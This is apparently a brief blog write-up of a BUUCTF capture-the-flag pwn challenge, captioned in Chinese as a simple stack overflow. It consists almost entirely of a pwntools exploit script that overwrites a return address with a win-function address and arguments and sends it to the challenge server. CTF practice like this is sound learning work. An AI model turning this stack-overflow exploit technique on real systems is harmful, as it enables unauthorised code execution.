+++
title = "wp"
date = "2026-04-21"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
Pasted image 20260421184217.png
简单栈溢出
```python
from pwn import *  
elf = ELF('./pwn')  
context.terminal = ['tmux', 'splitw', '-h']  
context(log_level='debug', arch='i386', os='linux')  
select = 1  
if select == 0:  
    r = process( './pwn' )  
    #libc = ELF(local_libc)  
else:  
    r=remote('node5.buuoj.cn',29621)  
    #libc = ELF(remote_libc)  
#elf = ELF(local_file)  
  
def dbg():  
    gdb.attach(p)  
    pause()  
  
win = 0x080485CB  
offset = 108 + 4  
a1 = 0xDEADBEEF  
a2 = 0xDEADC0DE  
main = 0x0804866D  
  
payload = b'A' * offset + p32(win) + p32(main) + p32(a1) + p32(a2)  
r.sendlineafter(b"Please enter your string: ", payload)  
  
  
r.interactive()
```
